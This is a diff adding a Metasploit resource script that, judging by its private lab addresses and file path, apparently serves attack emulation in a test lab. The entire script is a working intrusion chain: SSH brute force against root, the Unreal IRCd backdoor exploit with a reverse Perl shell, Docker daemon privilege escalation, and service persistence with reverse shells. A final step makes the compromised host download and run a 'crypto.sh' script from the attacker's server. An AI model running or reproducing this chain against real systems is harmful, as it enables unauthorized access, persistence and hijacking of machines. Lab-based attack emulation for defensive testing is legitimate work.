@@ -1,0 +1,75 @@
+# ============================================================
+# STEP 1 - SSH Brute Force
+# ============================================================
+
+sleep 15
+
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 192.168.56.181
+set RPORT 22
+set USERNAME root
+set PASS_FILE /home/ahnafrr/Desktop/attackmate/unix_passwords_modified.txt
+run
+
+sleep 15
+
+# ============================================================
+# STEP 2 - Unreal IRCd 3281 Backdoor
+# ============================================================
+
+use exploit/unix/irc/unreal_ircd_3281_backdoor
+set payload cmd/unix/reverse_perl
+set LHOST 192.168.56.191
+set LPORT 4444
+set RHOSTS 192.168.56.181
+set RPORT 6667
+exploit -j
+
+sleep 15
+
+# ============================================================
+# STEP 3 - Docker Daemon Privilege Escalation
+# ============================================================
+
+use exploit/linux/local/docker_daemon_privilege_escalation
+set payload linux/x86/meterpreter/reverse_tcp
+set SESSION 1
+set LHOST 192.168.56.191
+set LPORT 4444
+exploit -j
+
+sleep 15
+
+# ============================================================
+# STEP 4 - Service Persistence
+# ============================================================
+
+use exploit/linux/local/service_persistence
+set payload cmd/unix/reverse_python
+set SESSION 2
+set LHOST 192.168.56.191
+set VERBOSE True
+exploit -j
+
+sessions -k 2,3
+
+sleep 15
+
+# ============================================================
+# STEP 5 - Multi Handler
+# ============================================================
+
+use exploit/multi/handler
+set payload cmd/unix/reverse_python
+set LHOST 192.168.56.191
+exploit -j
+
+sleep 15
+
+# ============================================================
+# STEP 6 - 
+# ============================================================
+
+sessions -c "wget --no-check-certificate http://192.168.56.191/downloads/crypto.sh " -i 4
+sessions -c "chmod 755 ./crypto.sh" -i 4
+sessions -c "timeout 60s ./crypto.sh &" -i 4
